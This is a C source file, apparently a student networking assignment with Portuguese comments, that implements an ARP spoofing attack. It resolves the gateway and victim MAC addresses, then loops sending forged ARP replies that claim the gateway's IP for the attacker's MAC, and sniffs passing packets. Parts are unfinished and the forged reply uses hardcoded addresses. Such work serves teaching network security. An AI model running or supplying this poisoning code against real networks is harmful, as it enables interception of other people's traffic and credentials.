#include "arp.h"

#include "socketSetup.h"
#include "arpLib.h"

#include <unistd.h>
#include <signal.h>
#include <stdio.h>
#include <string.h>

//Ignore unused return values
#pragma GCC diagnostic ignored "-Wunused-result"

//PERGUNTAS:
//1) Descobrir com o professor como rodar aplicação no CORE-Emulator
// R: O terminal já tem acesso ao computador do usuário. Basta copiar o programa (cp)
//2) É possível assumir que a rede é conhecida? (IP e MAC de todos os PCs hardcoded) Ou deve-se descobrir em runtime?
// R: Não. Os IPs das máquinas devem ser passadas como parâmetro e o programa deve descobrir o MAC Address através de uma mensagem ARP Request
//3) Como fazer com que o computador que está rodando o CORE-Emulator se comunique com as máquinas do Emulador (enviar ping, arp, etc...)?

//IMPLEMENTAR:
//1)API que imprime no console os campos de um pacote ARP (hw_type, prot_type, etc...)
//2)API para enviar pacotes ARP
//3)API para receber pacotes ARP

//Struct holding all required information to run ARP spoofing application
typedef struct {
	socket_aux socketInfo;
	uint8_t gatewayMAC[6];
	uint8_t gatewayIP[4];
	uint8_t victimMAC[6];
	uint8_t victimIP[4];
} arpPoisonData_t;


//Example function of ARP Reply message
void arpReplyExample(socket_aux* socketInfo)
{
	char gateway_mac[6] = {0x00, 0x00, 0x00, 0xaa, 0x00, 0x00};
	unsigned char gateway_ip[4] = {10, 0, 0, 1};
	char victim_mac[6] = {0x00, 0x00, 0x00, 0xaa, 0x00, 0x01};
	unsigned char victim_ip[4] = {10, 0, 0, 20};

	union eth_buffer buffer_u;

	/* fill the Ethernet frame header */
	memcpy(buffer_u.cooked_data.ethernet.dst_addr, victim_mac, ETH_ALEN);
	memcpy(buffer_u.cooked_data.ethernet.src_addr, socketInfo->this_mac, ETH_ALEN);
	buffer_u.cooked_data.ethernet.eth_type = htons(ETH_P_ARP);

	/* fill payload data (incomplete ARP request example) */
	buffer_u.cooked_data.payload.arp.hw_type = htons(1);	//Hardware type: 1(Ethernet)
	buffer_u.cooked_data.payload.arp.prot_type = htons(ETH_P_IP);	//Protocol type: IPV4(0x0800)
	buffer_u.cooked_data.payload.arp.hlen = 6;	//Hardware Length: MAC address length (6 bytes)
	buffer_u.cooked_data.payload.arp.plen = 4;	//Protocol Length: Length (in octets) of IPV4 address field (4 bytes)
	buffer_u.cooked_data.payload.arp.operation = htons(2);	//Operation: 1 for Request; 2 for reply
	//ARP Spoofing
	//Send a fake ARP Reply message to the victim PC saying that the MAC Address of this PC (attacker) is the Default Gateway MAC Address
	memcpy(buffer_u.cooked_data.payload.arp.src_hwaddr, socketInfo->this_mac, ETH_ALEN);	//Source MAC Address
	memcpy(buffer_u.cooked_data.payload.arp.src_paddr, gateway_ip, 4);	//Source IPV4 address
	memcpy(buffer_u.cooked_data.payload.arp.tgt_hwaddr, victim_mac, ETH_ALEN);	//Target MAC Address
	memcpy(buffer_u.cooked_data.payload.arp.tgt_paddr, victim_ip, 4);	//Target IPV4 address

	/* Send it.. */
	memcpy(socketInfo->socket_address.sll_addr, victim_mac, ETH_ALEN);
	if (sendto(socketInfo->sockfd, buffer_u.raw_data, sizeof(struct eth_hdr) + sizeof(struct arp_packet), 0, (struct sockaddr*)&socketInfo->socket_address, sizeof(struct sockaddr_ll)) < 0)
		printf("Send failed\n");
}


//Example function of received packet
void receivePacketExample(socket_aux* socketInfo)
{
	union eth_buffer buffer_u = {0};

	/* To receive data (in this case we will inspect ARP and IP packets)... */
	int numbytes = recvfrom(socketInfo->sockfd, buffer_u.raw_data, ETH_LEN, 0, NULL, NULL);

	if (buffer_u.cooked_data.ethernet.eth_type == ntohs(ETH_P_ARP)){
		printf("ARP packet, %d bytes - operation %d\n", numbytes, ntohs(buffer_u.cooked_data.payload.arp.operation));
	}
	if (buffer_u.cooked_data.ethernet.eth_type == ntohs(ETH_P_IP)){
		printf("IP packet, %d bytes - src ip: %d.%d.%d.%d dst ip: %d.%d.%d.%d proto: %d\n",
			numbytes,
			buffer_u.cooked_data.payload.ip.src[0], buffer_u.cooked_data.payload.ip.src[1],
			buffer_u.cooked_data.payload.ip.src[2], buffer_u.cooked_data.payload.ip.src[3],
			buffer_u.cooked_data.payload.ip.dst[0], buffer_u.cooked_data.payload.ip.dst[1],
			buffer_u.cooked_data.payload.ip.dst[2], buffer_u.cooked_data.payload.ip.dst[3],
			buffer_u.cooked_data.payload.ip.proto
		);
	}
	
	if(numbytes > 0)
	{
		printf("got a packet, %d bytes\n", numbytes);
	}
}


//Child process created to poison 
void arpPoisonProcess(arpPoisonData_t* arpData)
{
	while(1)
	{
		//Send ARP reply to gateway
		//Send ARP reply to victim
		//sendARPPacket()
		arpReplyExample(&arpData->socketInfo);

		//wait to send another message
		sleep(1);
	}	
}

void printHelp()
{
	printf("Usage: ./arpspoofing.out <interface name> <gateway IP> <victim IP>\n");
	printf("E.G.: ./arpspoofing.out enp2s0 192.168.0.1 192.168.0.2\n");
}

int isIPForwardEnabled()
{
	int result = 1;	//Operation result
	FILE *fp;		//Pipe output

	//Create pipe to get 'cat' program response
	fp = popen("cat /proc/sys/net/ipv4/ip_forward", "r");	
	
	if (fp == NULL) 
	{
		//Fail to execute command
		printf("Fail to verify if IP forward is enabled (/proc/sys/net/ipv4/ip_forward)\n");
		result = -2;
	}
	else
	{
		//Extract IP forward config value
		int isIPFwdEnabled;
		fscanf(fp, "%d", &isIPFwdEnabled);
		pclose(fp);
		
		//Terminate application if IP forward is not enabled
		if (isIPFwdEnabled != 1) 
		{
			result = -3;
			printf("Fail to run application. IP Forward is not enabled in this host\n");
			printf("Please execute: sudo sysctl -w net.ipv4.ip_forward=1\n");
		}
	}

	return result;
}

int main(int argc, char *argv[])
{
	int result = 1;	//Operation result
	arpPoisonData_t arpData; //Struct holding all required information to run ARP spoofing application

	if (argc != 4) 
	{
		printHelp();
		result = -1;
	}
	else
	{	
		//Scan Gateway IP
		sscanf(argv[2], "%hhu.%hhu.%hhu.%hhu", &arpData.gatewayIP[0], &arpData.gatewayIP[1], &arpData.gatewayIP[2], &arpData.gatewayIP[3]);
		//Scan Victim IP
		sscanf(argv[3], "%hhu.%hhu.%hhu.%hhu", &arpData.victimIP[0], &arpData.victimIP[1], &arpData.victimIP[2], &arpData.victimIP[3]);
	}

	//Check if port forward is enabled
	if (result == 1) {
		result = isIPForwardEnabled();
	}
	
	//Create socket and set up interface to promiscouos mode
	if(result == 1)
	{
		result = socketSetup(argc, argv, &arpData.socketInfo);
	}

	//TODO: Send ARP Request message to get the gateway MAC and victim MAC
	if (result == 1) 
	{
		union eth_buffer receivedPacket;	//Temporary buffer to reveive ARP packages from victims
		initPackets(&arpData.socketInfo);	//Initialize ARP library

		if(sendARPRequestPacket(&arpData.socketInfo, arpData.gatewayIP, arpData.victimIP) <= 0)
		{
			printf("Fail to send ARP Request packet to Gateway\n");
			result = -2;
		}
		if((result == 1) && (rcvARPPacket(&arpData.socketInfo, &receivedPacket, arpData.gatewayIP) <= 0))
		{
			printf("Fail to receive ARP Reply packet from Gateway\n");
			result = -3;
		}		
		if (result == 1) 
		{
			memcpy(arpData.gatewayMAC, receivedPacket.cooked_data.ethernet.src_addr, ETH_ALEN);
		}
		

		if((result == 1) && (sendARPRequestPacket(&arpData.socketInfo, arpData.victimIP, arpData.gatewayIP) <= 0))
		{
			printf("Fail to send ARP Request packet to Victim\n");
			result = -4;
		}
		if((result == 1) && (rcvARPPacket(&arpData.socketInfo, &receivedPacket, arpData.victimIP) <= 0))
		{
			printf("Fail to receive ARP Reply packet from Victim\n");
			result = -5;
		}
		if (result == 1) 
		{
			memcpy(arpData.victimMAC, receivedPacket.cooked_data.ethernet.src_addr, ETH_ALEN);
		}		
	}
	

	/* End of configuration. Now we can send and receive data using raw sockets. */
	if(result == 1)
	{		
		// Create the child process that will periodically send ARP Reply messages (poison gateway / victim)
		pid_t child_id = fork();
		if (child_id == 0)
		{
			arpPoisonProcess(&arpData);
		}
		else
		{
			//Host process: Receive and print packets
			while(1)
			{
				//TODO: Implement receive packet
				//rcvARPPacket()
				//TODO: Print packet data
				//printARPPacket()
				receivePacketExample(&arpData.socketInfo);
			}

			//Finalize: Kill child process and close socket
			kill(child_id, SIGKILL);
			shutdown(arpData.socketInfo.sockfd, 2);   //Stop both reception and transmission of the socket
		}
	}

	return result;
}
